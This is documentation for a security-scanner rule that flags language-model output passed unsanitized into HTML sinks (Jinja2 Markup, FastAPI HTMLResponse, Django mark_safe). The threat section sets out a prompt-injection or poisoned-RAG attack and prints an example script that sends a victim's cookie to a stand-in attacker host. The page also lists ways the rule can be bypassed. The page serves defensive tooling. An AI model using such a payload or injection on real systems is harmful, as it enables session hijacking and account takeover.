---
type: Guard
title: "llm-output-html-sink"
description: "LLM output flows into an HTML sink — model-driven XSS."
timestamp: "2026-06-27T00:35:34+08:00"
guard_id: "llm-output-html-sink"
checklist_section: ["3b", "4"]
standards: ["OWASP-LLM:LLM02", "OWASP-LLM:LLM05", "OWASP:A03"]
---

# LLM output flows into an HTML sink — model-driven XSS

Flags LLM output flowing directly into an HTML rendering sink. Closes the residual gap in
checklist item `4-llm-output-sanitized`. OWASP-LLM:LLM05 (Improper Output Handling) /
OWASP:A03 / CWE-79.

## Why this guard (the XSS companion)

`llm-output-to-sink` covers the *execution* path (exec/eval/os.system). This guard covers the
*HTML rendering* path: the app receives a model response and marks it as safe HTML or sends it
directly to a browser. Both are LLM05 violations; both let an attacker who controls the model's
output (via prompt injection or poisoned RAG content) deliver a payload to the next human who
sees the rendered result.

The three concrete sinks:

1. **`Markup(var)`** — Jinja2/Werkzeug's `Markup` class marks a string as safe, bypassing
   auto-escaping in every Jinja2 template that renders it. Legitimate use: wrapping HTML you
   generated in controlled code. Illegitimate use: wrapping model output without sanitization.

2. **`HTMLResponse(var)` / `HTMLResponse(content=var)`** — FastAPI/Starlette sends the value
   verbatim with `Content-Type: text/html`. The browser parses it as HTML, executing any
   `<script>` tag or event handler the model's output contains.

3. **`mark_safe(var)`** — Django's `django.utils.safestring.mark_safe` marks a string as
   pre-sanitized so the Django template engine renders it without auto-escaping. Functionally
   identical to `Markup()` for Jinja2: legitimate for HTML you built yourself, a direct XSS
   sink when wrapping unsanitized model output. Added on the strength of `llmarmor/llmarmor`'s
   LLM05 rule (`src/llmarmor/rules/llm05_improper_output.py`), a real static OWASP-LLM-Top-10
   scanner that flags this exact sink for LLM output — cross-checked against this guard's
   existing `Markup()`/`HTMLResponse()` coverage before adding it.

Note: `render_template_string(var)` (SSTI, escalates to RCE) is already covered by the
separate `ssti` guard, which fires on all Python stacks. This guard adds the XSS path and is
gated on `llm` to focus on model-output handling.

## The threat

An attacker sends a message to the app that gets into the model's context (direct prompt
injection) or poisons a RAG document (indirect injection). The injected payload contains HTML:
`<script>document.location='https://attacker.com/'+document.cookie</script>`. The model echoes
or incorporates this content. The app passes the response to `Markup(response)` or
`HTMLResponse(content=response)`. The user's browser executes the script — cookie theft, session
hijack, or full account takeover.

## Exploitability rationale

Severity HIGH: a model-output-to-HTML-sink is a very high-confidence bug. The model's output is
fully attacker-influenced once prompt injection is possible; without sanitization the attacker has
a reliable XSS primitive. A pragma is provided for cases where the caller pre-sanitizes
(e.g. `Markup(bleach.clean(content, tags=ALLOWED_TAGS))`).

## What counts as a hit (and what doesn't)

**Fires:**
- `return Markup(llm_response)` — variable, not a literal
- `return HTMLResponse(content=ai_output)` — variable content argument
- `return HTMLResponse(f"<p>{model_text}</p>")` — f-string (model_text embedded)
- `return Markup(response + extra)` — concatenation
- `return mark_safe(llm_response)` — variable, not a literal (same rule as `Markup`)

**Silent:**
- `Markup("<b>static text</b>")` — string literal (safe constant)
- `HTMLResponse(content="<html><body>OK</body></html>")` — string literal
- `mark_safe("<b>static label</b>")` — string literal, even assigned to an unrelated name
  (e.g. `static_html = mark_safe(...)`)
- `Markup(html.escape(user_input))` — flagged (escape call is not recognized as safe);
  suppress with `# security: allow-llm-html-sink` after confirming escape is correct

## When NOT to flag (and the pragma)

A line pre-sanitized with `html.escape()`, `bleach.clean()`, or an allowlist before marking
as `Markup`/`mark_safe` is safe. The guard cannot verify sanitization depth statically, so
suppress with `# security: allow-llm-html-sink` and document the sanitizer used.

## Known bypasses (honest limits)

- **Indirection.** `safe = Markup(response)` on one line, then `return render_template(...,
  content=safe)` on another. The guard catches the `Markup()` call, so the finding is
  correct — the fix is to not call `Markup(response)` in the first place.
- **Multiline arguments.** `HTMLResponse(\n  content=llm_result\n)` across multiple lines is
  not detected (one-line pattern, same limitation as sibling guards).
- **Custom HTML response wrappers.** An app-layer `html_response(text)` that calls
  `HTMLResponse` internally is not recognized.

## Checklist item

`4-llm-output-sanitized` (PARTIAL → COVERED). The item is now covered by two guards:
`llm-output-to-sink` (code-execution sinks) and this guard (HTML rendering sinks, now including
Django's `mark_safe()`).
Verified by: `tests/guards/test_llm_output_html_sink.py::test_llm_output_html_sink_markup_variable` (planted violation),
`tests/guards/test_llm_output_html_sink.py::test_llm_output_html_sink_fp_literal_markup` (FP-bait — literal arg),
`tests/guards/test_llm_output_html_sink.py::test_llm_output_html_sink_mark_safe_variable` (planted violation — Django sink),
and `tests/guards/test_llm_output_html_sink.py::test_llm_output_html_sink_fp_literal_mark_safe` (FP-bait — literal arg, Django sink).

# Citations

[1] agentsec checklist item `4-llm-output-sanitized` (§4)
[2] agentsec checklist item `3b-llm-output-sanitized` (§3b) — this guard also closes the
    single-endpoint case (no full lethal-trifecta needed) that `lethal-trifecta` alone missed
[3] OWASP-LLM:LLM02
[4] OWASP-LLM:LLM05
[5] OWASP:A03
